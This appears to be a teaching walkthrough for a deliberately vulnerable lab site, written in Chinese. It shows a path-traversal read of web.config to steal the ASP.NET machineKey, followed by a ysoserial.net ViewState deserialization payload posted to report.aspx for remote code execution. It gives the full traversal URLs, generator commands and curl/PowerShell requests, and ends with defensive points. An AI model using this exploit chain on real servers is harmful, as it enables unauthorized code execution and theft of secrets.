# 真實渗透流程：两阶段 RCE 攻击

本文档说明攻击者如何**从零开始发现和利用漏洞**，而不是凭空知道参数。

---

## 阶段 0：侦察与发现（Reconnaissance）

### 步骤 0.1：访问主网站

攻击者打开浏览器访问：

```
http://target-ip:8080/
```

看到一个**专业的 FLUX 创意机构网站**。表面上无任何异常。

### 步骤 0.2：打开浏览器开发者工具

**按 F12** 打开开发者工具 → 切换到「Network」标签

### 步骤 0.3：刷新页面并观察网络请求

页面加载时，攻击者在 Network 标签中看到：

```
GET /              200 OK
GET /index.html    200 OK
GET download.aspx?file=assets/case-nexus.jpg     404 Not Found
GET download.aspx?file=assets/case-kinetic.jpg   404 Not Found
GET download.aspx?file=assets/case-pulse.jpg     404 Not Found
GET download.aspx?file=assets/case-verso.jpg     404 Not Found
```

💡 **关键发现**：页面通过 `download.aspx?file=<path>` 来加载资源！

### 步骤 0.4：分析 file= 参数

攻击者注意到：
- 页面使用 `download.aspx` 这个端点
- 通过 `file=` 参数指定要加载的文件路径
- 文件路径看起来是相对的（`assets/case-nexus.jpg`）

💭 **攻击者的想法**：
> "如果这个参数没有验证，我可能可以做路径穿越（`../../../`）来读取其他文件！"

---

## 阶段 1：路径穿越漏洞利用（LFI Attack）

### 步骤 1.1：测试路径穿越

在浏览器地址栏或用 curl，攻击者尝试：

```
http://target-ip:8080/download.aspx?file=..\..\windows\win.ini
```

**结果**：✅ 成功！看到 win.ini 的内容

💡 **确认**：`download.aspx` 没有任何路径验证！

### 步骤 1.2：目标：读取 web.config

攻击者知道 ASP.NET 应用的配置文件通常在：

```
C:\inetpub\wwwroot\<appname>\web.config
```

尝试访问：

```
http://target-ip:8080/download.aspx?file=..\..\web.config
```

或更准确的路径：

```
http://target-ip:8080/download.aspx?file=C:\inetpub\wwwroot\VulnerableApp\web.config
```

### 步骤 1.3：提取 machineKey

浏览器下载或显示 web.config 内容，攻击者在其中找到：

```xml
<!-- 以下内容会被硬编在 web.config 中 -->
<machineKey 
    validationKey="A1B2C3D4E5F6A7B8C9D0E1F2A3B4C5D6E7F8A9B0C1D2E3F0"
    decryptionKey="F8A7B6C5D4E3F2A1B0C9D8E7F6A5B4C3D2E1F0A9B8C7D6E5F4"
    validation="HMACSHA256"
    decryption="AES" />
```

✅ **阶段 1 完成**：攻击者已获得 machineKey！

---

## 阶段 2：ViewState 反序列化 RCE

### 步骤 2.1：发现 report.aspx

攻击者继续探索，发现：

```
http://target-ip:8080/report.aspx
```

这是一个有表单的页面，会生成 `__VIEWSTATE` 隐藏字段。

### 步骤 2.2：使用 ysoserial.net 生成 payload

在攻击机上（需要安装 ysoserial.net）：

```powershell
# 准备变量
$validationKey = "A1B2C3D4E5F6A7B8C9D0E1F2A3B4C5D6E7F8A9B0C1D2E3F0"
$decryptionKey = "F8A7B6C5D4E3F2A1B0C9D8E7F6A5B4C3D2E1F0A9B8C7D6E5F4"

# 第一步：生成 payload（验证是否可行）
.\ysoserial.net.exe `
  -p ViewState `
  -g TypeConfuseDelegate `
  --validationkey $validationKey `
  --validationalg HMACSHA256 `
  --decryptionkey $decryptionKey `
  --decryptionalg AES `
  --isencrypted `
  'cmd /c "whoami > C:\inetpub\wwwroot\VulnerableApp\pwned.txt"'
```

**输出**：一长串 Base64 编码的 payload（例如）：

```
/wEy4QKAAQA8YXJ0aW4gISENQ0V0aWZpY2F0ZUludGVyZmFjZQNd...（非常长）...MTE1MTExMTExMTE=
```

### 步骤 2.3：构造 HTTP POST 请求

攻击者需要向 report.aspx 发送 POST 请求，将恶意 ViewState 放在 `__VIEWSTATE` 参数中。

**使用 curl**：

```bash
curl -X POST \
  -d "__VIEWSTATE=/wEy4QKAAQA8YXJ0aW4gISEN..." \
  -d "__VIEWSTATEGENERATOR=" \
  -d "txtReportName=test" \
  -d "txtReportDate=2024-01-01" \
  "http://target-ip:8080/report.aspx"
```

**或使用 PowerShell**：

```powershell
$payload = "/wEy4QKAAQA8YXJ0aW4gISEN..."  # 粘贴完整 payload

$body = @{
    "__VIEWSTATE" = $payload
    "__VIEWSTATEGENERATOR" = ""
    "txtReportName" = "test"
    "txtReportDate" = "2024-01-01"
}

Invoke-WebRequest `
    -Uri "http://target-ip:8080/report.aspx" `
    -Method POST `
    -Body $body `
    -ErrorAction SilentlyContinue
```

### 步骤 2.4：验证 RCE 成功

攻击者访问：

```
http://target-ip:8080/pwned.txt
```

或在伺服器上检查文件是否存在：

```
C:\inetpub\wwwroot\VulnerableApp\pwned.txt
```

**内容**：
```
IISAPPPOOL\VULNERABLEAPPPOOL
```

✅ **RCE 成功**！命令已以 IIS App Pool 身分执行！

---

## 🎯 完整攻击流程图

```
┌──────────────────────────────────────────┐
│  1. 访问网站 (FLUX 创意机构)              │
│     http://target-ip:8080/                │
│  ⬇️                                        │
│  2. 打开开发者工具（F12）                  │
│  ⬇️                                        │
│  3. 查看 Network 标签                      │
│     ✓ 看到：download.aspx?file=...       │
└──────────────────────────────────────────┘
              ⬇️
┌──────────────────────────────────────────┐
│  【阶段 1：LFI 路径穿越】                  │
├──────────────────────────────────────────┤
│  1. 尝试路径穿越                           │
│     file=..\..\windows\win.ini            │
│  ⬇️                                        │
│  2. 成功！现在尝试读 web.config            │
│     file=C:\inetpub\wwwroot\...\web.config
│  ⬇️                                        │
│  3. 提取 machineKey:                      │
│     - validationKey                       │
│     - decryptionKey                       │
│     - validation="HMACSHA256"             │
│     - decryption="AES"                    │
└──────────────────────────────────────────┘
              ⬇️
┌──────────────────────────────────────────┐
│  【阶段 2：ViewState RCE】                │
├──────────────────────────────────────────┤
│  1. 用 ysoserial.net + machineKey         │
│     生成恶意 ViewState                    │
│  ⬇️                                        │
│  2. POST 到 report.aspx                   │
│     __VIEWSTATE=[恶意 payload]            │
│  ⬇️                                        │
│  3. ASP.NET 框架:                         │
│     - 接收 payload                        │
│     - 用 machineKey 验证签名 ✓             │
│     - 用 machineKey 解密 ✓                 │
│     - 反序列化 gadget chain                │
│     - 执行恶意命令 ✓                       │
│  ⬇️                                        │
│  4. 验证 RCE 成功                         │
│     访问 pwned.txt 看到命令输出            │
└──────────────────────────────────────────┘
              ⬇️
          🎯 RCE 完成！
     (以 IIS App Pool 身分)
```

---

## 📊 关键发现点总结

| 步骤 | 发现方法 | 找到的信息 |
|---|---|---|
| 1 | 浏览网站 + F12 Network | `download.aspx?file=` 参数存在 |
| 2 | 测试路径穿越 | 无路径验证 |
| 3 | 读取 web.config | machineKey 完整暴露 |
| 4 | 访问 report.aspx | 页面使用 __VIEWSTATE |
| 5 | 生成 + 发送 payload | RCE 成功 |

---

## 🛡️ 为什么这个攻击有效？

### 漏洞 1：路径穿越（LFI）
```csharp
// download.aspx 中的代码（漏洞）
string filePath = Request.QueryString["file"];
byte[] fileBytes = File.ReadAllBytes(filePath);  // ❌ 没有验证！
```

**后果**：攻击者可读任意文件

### 漏洞 2：硬编 machineKey
```xml
<!-- web.config -->
<machineKey validationKey="..." decryptionKey="..." />
```

**后果**：攻击者可伪造有效签名的 ViewState

### 漏洞 3：自动反序列化
```csharp
// ASP.NET 框架自动处理
// 只要 __VIEWSTATE 签名和加密正确，就会被反序列化执行
protected override void LoadViewState(object savedState) {
    // 框架自动调用，无法阻止
}
```

**后果**：gadget chain 自动执行

---

## 🎓 教学要点

这个靶机展示了：

✅ **多阶段攻击链**
- 从发现参数 → 利用漏洞 → 提取密钥 → RCE

✅ **信息泄露导致 RCE**
- LFI 泄露配置 → 获得加密密钥 → 伪造数据 → 代码执行

✅ **开发者工具是侦察的关键**
- 学生需要学会用 F12 查看网络请求
- 发现异常参数很重要

✅ **.NET 序列化的风险**
- ViewState 反序列化不应该信任客户端数据
- 即使有签名和加密，如果密钥泄露也会失效

✅ **配置文件保护很关键**
- web.config 不应该包含硬编密钥
- 应该使用密钥管理服务（KMS）或 Azure Key Vault

---

## 📝 总结

**攻击者的心路历程**：

```
1. "看起来是个专业网站"
   ↓
2. "等等，开发者工具显示有 download.aspx?file= 请求"
   ↓
3. "让我试试看能不能穿越目录..."
   ↓
4. "哇，成功了！让我读 web.config"
   ↓
5. "太好了，machineKey 就在里面！"
   ↓
6. "现在我可以伪造 ViewState 了..."
   ↓
7. "完成！我有 RCE 了！"
```

这就是真实的渗透流程 — 从观察到利用，一步步深化攻击！
